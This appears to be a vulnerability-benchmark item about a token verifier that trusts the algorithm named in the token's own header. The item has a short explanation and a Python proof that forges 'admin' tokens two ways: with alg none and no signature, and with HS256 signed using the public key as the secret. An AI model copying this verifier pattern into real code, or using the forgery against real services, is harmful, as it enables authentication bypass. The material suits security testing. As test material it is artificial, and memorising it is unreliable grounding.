title: Token verifier that takes the algorithm from the token's own header: alg none and HS256 signed with the public key are both accepted

planted.why: the algorithm is read from the token header: alg none is accepted with no signature, and HS256 is checked with the public key text as the secret, so anyone can mint a token for any subject

proof.python:
import base64, hashlib, hmac, json
import auth
b = lambda x: base64.urlsafe_b64encode(x).rstrip(b"=").decode()
head = lambda alg: b(json.dumps({"alg": alg}).encode())
body = b(json.dumps({"sub": "admin", "exp": 2000000000}).encode())
none_tok = head("none") + "." + body + "."
assert auth.verify_token(none_tok, now=1000)["sub"] == "admin", "alg none accepted"
hs = head("HS256") + "." + body
sig = hmac.new(auth.PUBLIC_KEY_PEM.encode(), hs.encode(), hashlib.sha256).digest()
assert auth.verify_token(hs + "." + b(sig), now=1000)["sub"] == "admin", "HS256 with the public key accepted"
